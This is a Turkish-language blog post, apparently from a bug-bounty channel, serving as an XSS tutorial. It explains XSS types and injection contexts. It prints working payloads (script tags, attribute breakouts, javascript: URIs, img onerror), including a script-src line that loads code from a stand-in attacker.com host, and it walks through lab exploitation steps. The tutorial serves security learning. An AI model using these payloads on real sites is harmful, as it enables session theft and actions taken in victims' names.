# XSS CHECKLIST

- **Source URL:** https://medium.com/@mehmetfarisacar/xss-checklist-a2bf18ed6992?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240921132607/https://medium.com/@mehmetfarisacar/xss-checklist-a2bf18ed6992
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7019 (id 7019)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# XSS CHECKLIST

Bu blog yazısında, XSS zaafiyeti ararken nelere dikkat edilmesi gerektiği ile ilgili bilgiler verilmiştir.

Ele Alınan Konular:

1.XSS Tanımı

2.XSS Türleri

3\. XSS Context

4.XSS Context Türleri ve XSS Context Türlerine Örnekler

5.Uygulamalı Şekilde XSS Zaafiyeti Arama

# **1.XSS**

XSS (Cross-Site Scripting), web uygulamalarında sıkça karşılaşılan ve kullanıcılar için ciddi güvenlik riskleri oluşturan bir zafiyettir. Bu zaafiyet, saldırganların kötü niyetli kodları (genellikle JavaScript) bir web sayfasına enjekte etmesine olanak tanır. Bu kötü amaçlı kod, **hedef kullanıcının browserında çalıştırılır** ve kişisel bilgilerin çalınması, oturumların ele geçirilmesi veya kullanıcı adına zararlı işlemler yapılması gibi tehlikeli sonuçlara yol açabilir. XSS zafiyetleri, genellikle **kullanıcı girdilerinin yeterince doğrulanmaması** veya **filtrelenmemesi** nedeniyle ortaya çıkar.

# **2.XSS TÜRLERİ**

**2.1.Reflected XSS**

Reflected XSS,bir web uygulamasının, **kullanıcının girdiği verileri yeterli doğrulama** veya **filtreleme yapmadan** geri döndürmesi sonucu ortaya çıkan bir güvenlik açığıdır. Bu tür saldırılarda, saldırgan zararlı kod içeren özel bir URL oluşturur ve hedef kullanıcıyı bu bağlantıya tıklaması için kandırır. Kullanıcı bağlantıya tıkladığında, zararlı kod sunucu tarafından işlenip doğrudan **kullanıcının browserında** çalıştırılır. Reflected XSS, genellikle **arama kutuları**, **formlar** veya **URL parametreleri** gibi **kullanıcı girdisinin anında işlendiği alanlarda** meydana gelir. Bu tür bir saldırı, kullanıcının kişisel bilgilerini çalmak, oturumları ele geçirmek veya kötü amaçlı işlemler gerçekleştirmek gibi ciddi güvenlik riskleri doğurur.

**2.2.Stored XSS**

Stored XSS, bir web uygulamasının kullanıcı tarafından girilen zararlı kodları sunucuda **kalıcı olarak depoladığı** ve bu kodların diğer kullanıcılar tarafından görüntülendiğinde **browserda** otomatik olarak çalıştırıldığı bir güvenlik açığıdır. Bu saldırı türünde, saldırgan zararlı bir kodu **form, yorum alanı gibi bir giriş noktası** üzerinden sisteme yerleştirir. Zararlı kod **sunucuya kaydedildiği için**, bu verilere erişen her kullanıcıda kod farkında olmadan çalışır ve saldırganın amacına ulaşması sağlanır. **Stored XSS, kalıcılığı ve çok sayıda kullanıcıyı etkileyebilme potansiyeli nedeniyle Reflected XSS’e kıyasla daha tehlikelidir**.Bir kez sunucuya yerleştirilen zararlı kod, çok sayıda kullanıcıyı etkileyebilir ve sürekli bir tehdit oluşturur. Bu tür saldırılar, kullanıcı bilgilerini çalmak, oturumları ele geçirmek veya zararlı yazılım yaymak gibi ciddi güvenlik riskleri taşır.

**2.3.DOM XSS**

DOM XSS, **browserda çalışan JavaScript kodunun** güvenli olmayan bir şekilde kullanıcı girdilerini işleyerek **zararlı kodun browserda çalışmasına** neden olduğu bir güvenlik açığıdır. Bu tür saldırılarda, saldırgan zararlı bir komut dosyasını web sayfasındaki bir **JavaScript değişkeni, fonksiyonu veya DOM elemanı aracılığıyla** enjekte eder. Diğer XSS türlerinden farklı olarak, DOM XSS saldırıları **sunucudan dönen yanıtı değil, istemci tarafında browserda işlenen sayfanın yapısını** hedef alır.

DOM XSS genellikle, **URL parametreleri, hash değerleri** veya **kullanıcı tarafından sağlanan diğer girdiler** üzerinde işlem yapan JavaScript kodlarının güvenli olmayan bir şekilde kullanılmasıyla ortaya çıkar. Örneğin, bir web sayfası URL’deki bir parametreyi doğrudan bir DOM elemanına atarsa ve bu işlem sırasında herhangi bir doğrulama yapılmazsa, saldırgan bu parametreyi manipüle ederek zararlı bir kodu çalıştırabilir.

Bu tür bir saldırı, saldırganın kullanıcı bilgilerini çalmasına, oturumlarını ele geçirmesine veya zararlı içerikler yaymasına olanak tanır. DOM XSS’in tespit edilmesi diğer XSS türlerine göre daha zor olabilir çünkü saldırı, **sunucu tarafında değil**, doğrudan **browserda** gerçekleşir.

# **3.XSS CONTEXT**

XSS Context, bir web sayfasında kullanıcı girdilerinin nerede ve nasıl işlendiği ile ilgili bizlere bilgi verir ve bu bilgi, potansiyel güvenlik açıklarını tespit etmek için büyük önem taşır. HTML,Attribute,JavaScript,URL gibi farklı context’ler, saldırı vektörlerini belirlemede kilit rol oynar ve her bir context, farklı türde XSS saldırılarına olanak tanır.

Hedef web uygulamasında kullanıcı girdilerinin hangi context’te işlendiğini anlamak, en etkili payload’u seçmek için gereklidir. Doğru context’i tespit etmek, XSS zaafiyetinin doğru bir şekilde tespit edilmesini ve sömürülmesini sağlar. Örneğin, HTML context’inde bir payload etkisiz olabilirken, aynı payload JavaScript context’inde çalışabilir. XSS Context bilgisi, bir zafiyeti ortaya çıkarırken en uygun yöntemi seçmeyi ve hedef uygulamada etkili bir saldırı vektörü belirlemeyi sağlar.

# **4.XSS CONTEXT TÜRLERİ**

**4.1.HTML CONTEXT**

HTML Context, bir web sayfasında kullanıcı girdilerinin doğrudan HTML etiketleri içinde yer aldığı ve browser tarafından HTML kodu olarak yorumlandığı durumu ifade eder. Bu context, özellikle kullanıcı tarafından sağlanan verinin HTML yapısına dahil edildiği ve özel karakterlerin uygun şekilde işlenmediği durumlarda XSS zaafiyetlerinin oluşmasına yol açar.

## HTML CONTEXT İLE İLGİLİ BİR ÖRNEK VERELİM:

Bir web uygulamasında, kullanıcının arama yaptığı kelimenin sonuç sayfasında bir \<p> tagi içinde görüntülendiğini düşünelim:

```
<html>
  <body>
    <p>Aradığınız kelime: <b>{{user_input}}</b></p>
  </body>
</html>
```
Burada kullanıcı tarafından girilen kelime doğrudan {{user\_input}} değişkeni aracılığıyla HTML içeriğine ekleniyor. Eğer bu kullanıcı girdisine herhangi bir doğrulama ya da filtreleme işlemi yapılmazsa bir XSS zafiyeti oluşabilir.

Burada payload olarak *\<script>alert(1)\</script>* payloadını kullanabiliriz.

{{user\_input}} değişkenine *\<script>alert(1)\</script>* payloadının atanmasıyla birlikte browser şu şekilde bir HTML yapısı oluşturur:

```
<html>
  <body>
    <p>Aradığınız kelime: <b><script>alert(1)</script></b></p>
  </body>
</html>
```
Bu HTML yapısı browser tarafından yorumlandığında script tagi çalıştırılır ve ekranda bir alert çıkar.

**4.2.ATTRIBUTE CONTEXT**

Attribute Context, kullanıcı girdisinin bir HTML etiketinin herhangi bir attribute’unun değeri olarak kullanıldığı durumu ifade eder. Bu context, kullanıcı girdisinin event handlers gibi işlevlerle birleştirilerek JavaScript kodunun çalıştırılması için kullanılabileceği bir alanı oluşturur. Attribute Context’te kullanıcı girdisi, 3 farklı şekilde attribute içinde yer alabilir:

1\. Double Quoted Input (Çift Tırnaklı Girdi)

2. Single Quoted Input (Tek Tırnaklı Girdi)

3. Without any quotation (Tırnaksız Girdi)

**4.2.1.Double Quoted Input (Çift Tırnaklı Girdi)**

Çift tırnaklı girdi, HTML attribute’larında kullanılan bir formattır. Burada kullanıcı girişi, attribute değerinin içinde çift tırnaklar arasında yer alır. Çift tırnaklı format, web uygulamalarında en yaygın kullanılan attribute değer formatıdır. Bu format, kullanıcı girdi değerlerinin attribute’un içindeki yerini belirler ve browser’ın bu girdiyi doğru şekilde işlemesini sağlar. Ancak, bu context’te zararlı bir kullanıcı girdisi, çift tırnaklı alan içinde çalıştırılarak XSS saldırılarına yol açabilir.

## Double Quoted Input (Çift Tırnaklı Girdi) İLE İLGİLİ BİR ÖRNEK VERELİM:

```
<html>
  <body>
    <input type="text" name="input" value="{{user_input}}">
  </body>
</html>
```
Bu örnekte, {{user\_input}} değişkeni, value attribute’u içinde çift tırnaklar arasında yer almakta. Eğer kullanıcı tarafından sağlanan bu girdi düzgün bir şekilde doğrulanmaz veya filtrelenmezse, XSS zafiyetine yol açabilir.

{{user\_input}} değişkenine *“>\<script>alert(1)\</script>* payloadının atanmasıyla birlikte şu şekilde bir HTML yapısı oluşturur:

```
<html>
  <body>
    <input type="text" name="input" value=""><script>alert(1)</script>">
  </body>
</html>
```
Bu durumda, value attribute’undaki payload, HTML yapısının bir parçası haline gelir ve browser tarafından çalıştırılır. Bu örnek, kullanıcı girdisinin attribute’lar içinde çift tırnaklar arasında yer aldığı context’te nasıl bir XSS zafiyeti oluşabileceğini açıkça gösterir. Saldırgan bu zafiyeti kullanarak kullanıcı adına zararlı işlemler gerçekleştirebilir veya bilgilerini çalabilir.

**4.2.2.Single Quoted Input (Tek Tırnaklı Girdi)**

Tek tırnaklı girdi, HTML attribute’larında kullanılan bir başka formattır. Bu formatta, kullanıcı girişi attribute değerinin içinde tek tırnaklar arasında yer alır. Tek tırnaklı girdi formatı, çift tırnaklı girdilere benzer şekilde çalışır, ancak kullanıcı girdisi tek tırnaklarla çevrelenir. Bu context’te de, zararlı bir kullanıcı girdisi tek tırnaklar arasına yerleştirilerek XSS saldırılarına yol açabilir.

## Single Quoted Input (Tek Tırnaklı Girdi) İLE İLGİLİ BİR ÖRNEK VERELİM:

```
<html>
  <body>
    <input type="text" name="input" value='{{user_input}}'>
  </body>
</html>
```
Bu örnekte, {{user\_input}} değişkeni, value attribute’u içinde tek tırnaklar arasında yer almakta. Eğer kullanıcı tarafından sağlanan bu girdi düzgün bir şekilde doğrulanmaz veya filtrelenmezse, XSS zafiyeti oluşabilir.

{{user\_input}} değişkenine *‘>\<script>alert(1)\</script>* payloadının atanmasıyla birlikte şu şekilde bir HTML yapısı oluşturur:

```
<html>
  <body>
    <input type="text" name="input" value=' '><script>alert(1)</script>'>
  </body>
</html>
```
**4.2.3.Without any quotation (Tırnaksız Girdi)**

Tırnaksız girdi, HTML attribute’larında kullanılan bir formattır ve bu formatta, kullanıcı girişi herhangi bir tırnak işareti olmadan attribute değerine doğrudan yerleştirilir. Tırnaksız girdi, genellikle en riskli context olarak kabul edilir çünkü bu formatta, kullanıcı girdisi herhangi bir sınırlayıcı olmaksızın attribute değeri olarak işlenir. Bu, zararlı bir kullanıcı girdisinin attribute içine yerleştirilip doğrudan çalıştırılmasına neden olabilir, bu da XSS zafiyetlerinin oluşmasını kolaylaştırır.

## Without any quotation (Tırnaksız Girdi) İLE İLGİLİ BİR ÖRNEK VERELİM:

```
<html>
  <body>
    <input type="text" name="input" value={{user_input}}>
  </body>
</html>
```
Bu örnekte, {{user\_input}} değişkeni, value attribute’u içinde herhangi bir tırnak kullanılmadan yer almakta. Eğer kullanıcı tarafından sağlanan bu girdi düzgün bir şekilde doğrulanmaz veya filtrelenmezse, XSS zafiyeti oluşabilir.

{{user\_input}} değişkenine *>\<script>alert(1)\</script>* payloadının atanmasıyla birlikte şu şekilde bir HTML yapısı oluşturur:

```
<html>
  <body>
    <input type="text" name="input" value=><script>alert(1)</script>>
  </body>
</html>
```
Bu durumda, value attribute’undaki payload, HTML yapısının bir parçası haline gelir ve browser tarafından çalıştırılır. Bu örnek, kullanıcı girdisinin attribute’lar içinde tırnak kullanılmadan yer aldığı context’te nasıl bir XSS zafiyeti oluşabileceğini gösterir. Saldırgan bu zafiyeti kullanarak kullanıcı adına zararlı işlemler gerçekleştirebilir veya bilgilerini çalabilir.

**4.3.URL CONTEXT**

URL Context, kullanıcının girdiği verilerin bir HTML etiketinde URL olarak kullanıldığı ve bu durumun genellikle uygulamada yapılan HTML kodlama/filtreleme işlemlerinin etkisiz kaldığı durumu ifade eder. Bu context, özellikle URL/link alanı gerektiren bazı HTML etiketlerinde ortaya çıkar ve kullanıcı girdisinin zararlı JavaScript kodları içermesine olanak tanır. Bu tür bir zafiyet, saldırganların zararlı kodları kullanıcı adına çalıştırmasına veya onları zararlı web sitelerine yönlendirmesine neden olabilir.

## **URL CONTEXT İLE İLGİLİ ÖRNEKLER:**

## 4.3.1.**Script Tag**

```
<html>
  <body>
    <script src="{{userinput}}"></script>
  </body>
</html>
```
Bu örnekte, src attribute’unda kullanıcının sağladığı girdi ({{userinput}}) doğrudan bir URL olarak kullanılmaktadır. Eğer bu girdi düzgün bir şekilde doğrulanmaz veya filtrelenmezse, saldırgan bu alanı kötüye kullanarak zararlı bir JavaScript dosyasını uzaktan yükleyebilir.

{{user\_input}} değişkenine [*http://attacker.com/evil.js*](http://attacker.com/evil.js) gibi bir URL atanırsa yapı şu şekilde olur:

```
<html>
  <body>
    <script src="http://attacker.com/evil.js"></script>
  </body>
</html>
```
Bu durumda, browser bu URL’yi kullanarak saldırganın barındırdığı zararlı evil.js dosyasını yükler ve çalıştırır. Bu tür bir saldırı, kullanıcının farkında olmadan zararlı komut dosyalarının çalıştırılmasına yol açar.

## 4.3.2.Anchor Tag

```
<html>
  <body>
    <a href="{{userinput}}">Click here</a>
  </body>
</html>
```
Bu örnekte, href attribute’unda kullanıcının sağladığı girdi ({{userinput}}) bir URL olarak kullanılıyor. Eğer bu girdi yeterince doğrulanmaz veya filtrelenmezse, saldırgan bu alanı kötüye kullanarak zararlı bir JavaScript kodunu çalıştırabilir.

{{user\_input}} değişkenine *javascript:alert(1)//* payloadı yazılırsa yapı şu şekilde olur:

```
<html>
  <body>
    <a href="javascript:alert(1)//">Click here</a>
  </body>
</html>
```
Bu durumda, kullanıcı linke tıkladığında tarayıcı, URL’yi bir JavaScript komutu olarak yorumlayacak ve alert(1) komutunu çalıştıracaktır. Sonuç olarak, ekranda bir uyarı penceresi (alert) belirecektir.

## Neden Bu Payload Çalıştı?

HTML’deki href attribute’u genellikle bir URL’yi (örneğin, [https://www.example.com)](<https://www.example.com)>) işaret eder ve kullanıcı bu linke tıkladığında tarayıcı bu URL’yi ziyaret eder. Ancak, javascript: şeması kullanıldığında, tarayıcı bu URL’yi bir web adresi olarak değil, doğrudan JavaScript kodu olarak işler.

## Payloadda Neden // Kullanıldı?

// işareti, JavaScript’te bir yorum satırının başlangıcını belirtir. Bu, tarayıcının // işaretinden sonraki tüm metni görmezden gelmesine neden olur. Peki, neden bu örnekte // kullanılıyor?

1. Bu payload, olası hataları veya güvenlik filtrelerini atlatmak için // kullanır. Örneğin, bazı tarayıcılar veya güvenlik yazılımları, JavaScript kodunu analiz ederken sonrasında gelen karakterlerin veya kodların tarayıcıda bir sorun yaratıp yaratmadığını kontrol eder. Ancak, // kullanarak, bu tür karakterleri veya kodları yorum satırı olarak işaretleyebilir ve tarayıcının bu kısmı göz ardı etmesini sağlayabiliriz.
2. \`href\` attribute’unda JavaScript kodunu çalıştırmak istiyorsanız ve bu attribute, bir HTML ya da JavaScript değişkeni içinde kullanılıyorsa, \`//\` işareti sonrası girilen karakterlerin hatalı bir HTML veya JavaScript yapısına neden olmasını engellemek için kullanılabilir. Örneğin, tarayıcı \`>\` karakteriyle karşılaşırsa, bu karakterin yorumlanmaması için \`//\` kullanılarak tarayıcıya bunun sadece bir yorum olduğunu belirtiriz.\`

## **4.4.Javascript Context**

JavaScript Context, kullanıcı girdisinin \<script> tagleri içinde veya bir event handler (olay işleyici) içerisinde JavaScript kodu olarak kullanıldığı durumu ifade eder. Bu context’te bir XSS zafiyeti oluştuğunda, saldırganın amacı genellikle JavaScript kodu içerisine enjekte ettiği zararlı komutları doğrudan çalıştırmaktır. Bu tür bir saldırıyı gerçekleştirebilmek için saldırganın genellikle yapması gereken şey, mevcut JavaScript kodunu bozmak (örneğin, tırnak işaretlerinden çıkmak) ve ardından istediği zararlı JavaScript fonksiyonunu doğrudan çalıştırmaktır.

JavaScript Context’te, kullanıcı girdisi güvenli bir şekilde işlenmezse, bu girdi içerisine zararlı JavaScript kodları enjekte edilerek kullanıcının tarayıcısında çalıştırılabilir. Bu da kullanıcının oturum bilgilerinin çalınması, zararlı yazılımların yüklenmesi veya kullanıcı adına kötü niyetli işlemlerin yapılması gibi sonuçlara yol açabilir.

Javascript Context İLE İLGİLİ ÖRNEK:

```
<html>
  <body>
    <script>
      var welcomeMessage = "Hoşgeldiniz, {{user_input}}!";
      document.write(welcomeMessage);
    </script>
  </body>
</html>
```
Bu HTML yapısında kullanıcıdan alınan girdi ({{user\_input}}) bir JavaScript değişkenine atanıyor ve bu değişkenin değeri document.write() fonksiyonu kullanılarak sayfaya yazdırılıyor.

Bu kod, kullanıcının girdiği bilgiyi bir karşılama mesajı olarak sayfada göstermek için tasarlanmış gibi görünüyor. Ancak, eğer bu kullanıcı girdisi güvenli bir şekilde işlenmezse, ciddi bir XSS zafiyetine yol açabilir.

{{user\_input}} değişkenine *“; alert(1); //* payloadı yazılırsa yapı şu şekilde olur:

```
<html>
  <body>
    <script>
      var welcomeMessage = "Hoşgeldiniz, "; alert(1); //!";
      document.write(welcomeMessage);
    </script>
  </body>
</html>
```
**\`”\` — Mevcut string’i kapatarak JavaScript kodunu bozar ve zararlı komutların çalışmasını sağlar.**

**\`;\` — Komutların doğru bir şekilde ayrılmasını ve bağımsız olarak çalıştırılmasını sağlar.**

**\`alert(1);\` — Zararlı komut olarak bir uyarı penceresi açar ve XSS saldırısını gerçekleştirir.**

**\`//\` — Kodun geri kalanını etkisiz hale getirir ve potansiyel hataları önler.**

`var welcomeMessage = "Hoşgeldiniz, "; alert(1); //document.write(welcomeMessage);`
# **5.UYGULAMALI ŞEKİLDE XSS ZAAFİYETİ ARAMA**

**Sayfaya girdiğimizde bizi bir input kısmı karşılıyor öncelikle input alanına herhangi bir değer yazıp kaynak kodunda nereye karşılık geldiğine bakalım.**

**input kısmına testtest yazarak nereye karşılık geldiğini bulduk.Bu kısım HTML Context olduğu için \<script>alert(1)\</script> payloadını kullanabiliriz.**

**Ve bu şekilde alerti çıkartmış olduk.**

Bir diğer uygulamaya geçelim.

**Bu blog sayfasında bir yorum yazma kısmı bulduk.**

**Bu kısımları rastgele değerlerle doldurup kaynak koda nasıl entegre edildiğini gözlemleyelim.**

**Burp suite ile araya girip değerleri inceleyebiliriz.**

**Kaynak kodu incelediğimizde gördüğümüz gibi input HTML Context tipinde olduğu için *\<script>alert(1)\</script>* payloadını deneyebiliriz.Örneğin payloadı comment kısmına yazalım.**

**Blog postun yorumları veritabanına eklendiği için yazdığımız payload veritabanına eklendi ve sayfa her yenilendiğinde payload çalışacak ve alert verecektir.**

Diğer uygulamaya geçelim:

**Karşımıza bir input alanı çıktı ve rastgele değerler deneyerek bu değerlerin kaynak kodunda nereye denk geldiğine bakalım:**

**Inputumuzun img taginde olduğunu ve Attribute Context tipinde olduğunu görüyoruz. Burada Attriube Context’in özelliğini kullanarak kaçmayı deneyeceğiz.**

*“>aa* yazarak kaçmayı denedik ve kaçtık.

*“>\<script>alert(1)\</script>* payloadını input alanına yazalım.

**Alerti almış olduk.**

Diğer uygulamaya geçelim:

**Tekrardan bizi bir input alanı karşılıyor ve yine rastgele bir değer girerek değerin kaynak kodunda nereye denk geldiğine bakalım:**

**Yazdığımız değer span tagi içerisine yerleştirilmiş.**

**script tagi içindeki Javascript kodunu inceleyelim.**

```
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```
```
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
```
**Bu fonksiyon, query adlı bir parametre alıyor.**

**document.getElementById(‘searchMessage’).innerHTML = query; satırı ile, HTML dokümanında id değeri searchMessage olan bir öğe bulunuyor ve bu öğenin içeriği (innerHTML) query parametresi ile değiştiriliyor. Yani, query değeri bu öğenin içine yazdırılıyor.**

`var query = (new URLSearchParams(window.location.search)).get('search');`
**window.location.search, URL’deki ? işaretinden sonraki kısmı (query string) temsil ediyor.**

**new URLSearchParams(window.location.search) ifadesi, bu sorgu dizisini analiz eden bir URLSearchParams nesnesi oluşturuyor.**

**.get(‘search’) metodu, bu sorgu dizisinde search adlı parametrenin değerini döndürür ve bu değer query değişkenine atanıyor.**

```
if(query) {
    doSearchQuery(query);
}
```
**Bu if bloğu, query değişkeninin bir değer içerip içermediğini kontrol ediyor.**

**Eğer query değişkeni bir değer içeriyorsa (null veya undefined değilse), doSearchQuery(query); fonksiyonu çağrılır ve bu değer sayfada searchMessage id’sine sahip HTML öğesine yazdırılıyor.**

**Şimdi input kısmına \<script>alert(1)\</script> payloadını yazalım.**

**Payloadı yazdığımızda alert çıkmadığını görüyoruz.**

**Peki neden?**

**\`\<script>alert(1)\</script>\` gibi bir payload, HTML’de \`innerHTML\`ile işlendiğinde doğrudan çalışmaz. Bunun sebebi, \`innerHTML\` özelliğinin HTML elemanlarını eklerken güvenlik için bazı önlemler almasıdır.\`innerHTML\`,\`script\`etiketlerini eklediğinde tarayıcı bunu çalıştırmaz çünkü bu bir güvenlik önlemidir. Bu, tarayıcıların XSS saldırılarına karşı yerleşik bir korumasıdır.**

**Şimdi farklı bir payload denememiz lazım.Örneğin \<img src=x onerror=alert(1)> payloadını deneyelim.**

**Görüldüğü gibi payloadımızı span tagi içine ekleyebildik ve alerti aldık.**

**Peki neden bu payload çalıştı?**

**\`innerHTML\`özelliğinin HTML etiketlerinin özelliklerini(\`attributes\`)olduğu gibi kabul etmesi ve tarayıcının bu özellikleri işlemesidir. Tarayıcı,\`img\`tagini oluşturduğunda geçersiz bir resim kaynağı (\`src=x\`) yüklemeye çalışır ve bu başarısız olduğunda \`onerror\`event handler’ı tetiklenir, bu da \`alert(1)\`’in çalışmasına neden olur.**

Özetle XSS Ararken Dikkat Edilmesi Gerekenler

- Sitedeki input alanları,URL parametreleri vb. kullanıcı girdisinin olabileceği yerlere dikkat edilmelidir.
- Bu alanlara rastgele bir değer girerek bu değerlerin kaynak kodundaki davranışını izlemeliyiz.Kullanıcı girdisine yeterli doğrulama ve filtreleme yapılmamış olabilir ve bu XSS zaafiyetine yol açabilir.
- Eğer ki kullanıcı girdisine yeterli doğrulama ve filtreleme yapılmamışsa kullanıcı girdisinin kaynak kodda hangi context type’a denk geldiğini doğru bir şekilde analiz edebilirsek doğru payload’ı kullanarak XSS zaafiyeti bulabiliriz.

Okuduğunuz için teşekkür ederim.
